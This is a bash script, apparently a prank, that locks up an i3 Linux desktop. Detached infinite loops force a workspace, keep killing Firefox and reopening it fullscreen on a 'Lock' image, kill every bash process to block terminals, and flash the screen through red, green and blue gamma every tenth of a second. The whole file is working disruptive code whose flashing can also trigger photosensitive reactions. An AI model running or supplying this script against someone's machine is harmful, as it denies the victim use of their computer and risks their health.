#!/bin/bash
SCREEN=$(xrandr | grep 'connected' | cut -d' ' -f1);

function forceWorkspace {
    i3-msg 'workspace 42';
}

function showImage {
    killall -9 firefox;
    sleep 0.2;
    firefox --new-window https://raw.githubusercontent.com/MarcVillain/Confloose/master/images/Lock.gif;
    i3-msg '[title=".*Mozilla Firefox"] fullscreen enable; [title=".*Mozilla Firefox"] move workspace 42';
}

function updateGamma {
    xrandr --output $SCREEN --gamma 1:0.001:0.001;
    sleep 0.1;
    xrandr --output $SCREEN --gamma 0.001:1:0.001;
    sleep 0.1;
    xrandr --output $SCREEN --gamma 0.001:0.001:1;
    sleep 0.1;
}

function preventBash {
    killall -9 bash;
}

while true; do forceWorkspace; done 2>&1>/dev/null &
while true; do showImage; done 2>&1>/dev/null &
while true; do updateGamma; done 2>&1>/dev/null &
while true; do preventBash; done 2>&1>/dev/null &
disown
